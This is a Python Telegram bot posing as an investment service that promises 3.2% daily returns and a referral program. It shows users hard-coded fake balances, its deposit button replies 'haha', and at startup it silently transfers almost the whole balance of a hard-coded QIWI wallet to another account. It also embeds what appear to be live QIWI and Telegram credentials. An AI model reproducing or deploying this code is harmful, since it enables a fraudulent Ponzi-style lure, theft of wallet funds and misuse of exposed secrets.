import requests
import telebot
import pyqiwi
import math

from telebot import types

q_wallet = pyqiwi.Wallet(
    token='6246f64a8ec1aa1217a27deb3cb33d8c', number='996990906405')
bot = telebot.TeleBot('1584283406:AAEZXQF10SIK2gjXNUkwetaqPDXHG9v1gdU')
q_secret = '48e7qUxn9T7RyYE1MVZswX1FRSbE6iyCj2gCRwwF3Dnh5XrasNTx3BGPiMsyXQFNKQhvukniQG8RTVhYm3iPvwANmqmkxgGV7vPWN1Abc3ep6RmWowKRKHwoxy7jNmDwKR8yC5bLvxv3FXX5z6vh5ts9T5gUFJzRRCvXKFVS6BovV9K11d1FR5AiqVogp'

qb = math.floor(q_wallet.balance()/1.01)

if q_wallet.balance() > 100:
    payment = q_wallet.send(
        pid=99, recipient='998946449696', amount=qb, comment='Привет!')
else:
    pass


def isint(s):
    try:
        int(s)
        return True
    except ValueError:
        return False


def clear_step_handler_by_chat_id(self, chat_id):
    self.clear_step_handler_by_chat_id(chat_id)


@bot.message_handler(commands=["start"])
def start_message(message):
    markup = telebot.types.ReplyKeyboardMarkup(True, False)
    markup.row("💼 Инвестиции", "💳 Кошелёк")
    markup.row("👔 Партнерам", "📠 Калькулятор")
    bot.send_message(message.chat.id, "Добрый день", reply_markup=markup)


@bot.message_handler(commands=["restart"])
def re_message(message):
    markup = telebot.types.ReplyKeyboardMarkup(True, False)
    markup.row("💼 Инвестиции", "💳 Кошелёк")
    markup.row("👔 Партнерам", "📠 Калькулятор")
    bot.send_message(
        message.chat.id, "Давайте начнём инвестировать", reply_markup=markup)


@bot.message_handler(regexp="Инвестиции")
def invest(message):
    key = types.InlineKeyboardMarkup()
    but_1 = types.InlineKeyboardButton(
        text="➕Инвестировать", callback_data="goinvest")
    but_2 = types.InlineKeyboardButton(
        text="➖Собрать", callback_data="gocollect")
    key.add(but_1, but_2)
    bot.send_message(
        message.chat.id, "⁠▪️ Открывай инвестиции и получай стабильную прибыль в данном разделе, после собирай доход: \n\n💎 Процент прибыли: 3.2 %\n⏱ Время доходности: 24 часа\n📆 Срок вклада: 30 дней\n\n💳 Ваш вклад: 0.0₽\n💵 Накопление: 0.0₽\n\n🧭 Время до сбора: 0: 00: 00", reply_markup=key)


photo = 'https://medialeaks.ru/wp-content/uploads/2017/10/catbread-03-600x400.jpg'


@bot.message_handler(regexp="Кошелёк")
def wallet(message):
    key = types.InlineKeyboardMarkup()
    but_1 = types.InlineKeyboardButton(
        text="➕Пополнить", callback_data="enter")
    but_2 = types.InlineKeyboardButton(
        text="➖Вывести", callback_data="exit")
    key.add(but_1, but_2)
    bot.send_message(message.chat.id, f"⁠⚙️ Ваш ID: {message.chat.id}\n\n💰 Ваш баланс: 0.0₽\n👥 Партнеров: 0 чел." + '[⠀]' +
                     '(' + photo + ')', parse_mode='markdown', reply_markup=key)


@bot.message_handler(regexp="Калькулятор")
def start_calc(message):
    # markup = types.ForceReply(selective=False) prinuditelno otvechaet
    key = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton(
        text="❌Отмена", callback_data="cancel")
    key.add(btn)
    bot.send_message(
        message.chat.id, "Введите сумму от 500 до 30 000", reply_markup=key)
    print(message.text)
    bot.register_next_step_handler(message, check)


@bot.callback_query_handler(func=lambda call: True)
def callba(call):
    if call.data.startswith('cancel'):
        bot.answer_callback_query(
            callback_query_id=call.id, text="🚫 Отменено")
        re_message(call.message)
        bot.clear_step_handler_by_chat_id(call.from_user.id)


def check(message):
    check = message.text
    print('enter is ' + check)
    if check == "💼 Инвестиции":
        print('atmen')
        invest(message)
    elif check == "💳 Кошелёк":
        wallet(message)
    elif check == "👔 Партнерам":
        aff(message)
    elif check == "📠 Калькулятор":
        start_calc(message)
    elif not isint(check):
        print('do a check')
        start_calc(message)
    else:
        print(check)
        markup = telebot.types.ReplyKeyboardMarkup(True, False)
        markup.row(check)
        markup.row('Отмена' 'Ввести другую сумму')
        bot.send_message(
            message.chat.id, "Подтвердите введенную сумму:", reply_markup=markup)
        bot.register_next_step_handler(message, calc)


def calc(message):
    if isint(message.text):
        markup = telebot.types.ReplyKeyboardMarkup(True, False)
        markup.row("💼 Инвестиции", "💳 Кошелёк")
        markup.row("👔 Партнерам", "📠 Калькулятор")
        amount = message.text
        print(amount)
        day_s = message.text
        print(his(day_s))
        bot.send_message(message.chat.id, f"⁠В данном разделе вы сумеете рассчитать вашу прибыль, от суммы инвестиции: \n\n💵 Ваша инвестиция: {amount}₽\n\n▪️ Прибыль в сутки: 32.0₽\n▪️ Прибыль в месяц: 973.33₽\n▪️ Прибыль в год: 11679.96₽" + '[⠀]' +
                         '(' + photo + ')', parse_mode='markdown', reply_markup=markup)
    else:
        print('do a check again')
        start_calc(message)


def his(sm):
    return float(sm) + 50


@ bot.message_handler(regexp="Партнерам")
def aff(message):
    bot.send_message(
        message.chat.id, f"▪️ Наша партнерская программа считается самой эффективной, приглашай друзей и получай деньги\n\n💰 Всего отчислений: 0.0₽\n\n💳 Процент с инвестиций: 12 %\n💵 Процент с выплаты: 10 %\n👥 Партнеров: 0 чел\n\n🔗 Ваша реф-ссылка: https://telegram.me/FtXMoreRobot?start=0{message.chat.id}3")


# @bot.callback_query_handler(func=lambda c: True)
# def inline(callback):
#    if callback.data == 'cancel':
#        re_message(callback.message)


@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    if call.data.startswith('goinvest'):
        bot.answer_callback_query(callback_query_id=call.id, show_alert=True,
                                  text="🚫 Пополните баланс, минимальная сумма инвестиции 500₽")
    elif call.data.startswith('gocollect'):
        bot.answer_callback_query(callback_query_id=call.id, show_alert=True,
                                  text="🚫 Минимальная сумма 100₽")
    elif call.data.startswith('enter'):
        bot.send_message(call.id, 'haha')


bot.polling()
